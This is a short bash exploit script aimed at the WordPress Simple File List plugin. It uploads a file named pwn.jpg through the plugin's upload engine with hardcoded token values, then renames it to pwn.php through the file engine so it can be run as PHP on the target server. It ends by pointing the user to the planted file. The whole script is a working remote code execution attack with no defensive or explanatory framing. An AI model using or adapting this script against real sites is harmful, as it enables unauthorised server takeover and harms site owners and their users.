#!/bin/bash

# Check if the required arguments are provided
if [ $# -ne 2 ]; then
    echo ""
    echo "Usage: $0 <target_url> <file_name>"
    echo ""
    echo "Example: $0 http://acme.org pwn.jpg"
    exit 1
fi

# Uploading the harmless file
echo ""
echo "Uploading harmless file"
echo ""
sleep 2
echo ""
curl -F "file=@pwn.jpg" -F 'eeSFL_ID=1' -F 'eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/' -F 'eeSFL_Timestamp=1587258885' -F 'eeSFL_Token=ba288252629a5399759b6fde1e205bc2' "$1/wp-content/plugins/simple-file-list/ee-upload-engine.php"

# Moving the harmless file to a PHP file
echo ""
echo "Moving the harmless file to a php file"
echo ""
sleep 2

curl -F 'eeSFL_ID=1' -H "Referer: $1/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" -H 'X-Requested-With: XMLHttpRequest' -F "eeFileOld=pwn.jpg" -F 'eeListFolder=/' -F 'eeFileAction=Rename|pwn.php' "$1/wp-content/plugins/simple-file-list/ee-file-engine.php"


echo ""
echo "Now go and check at: $1/wp-content/uploads/simple-file-list/pwn.php"
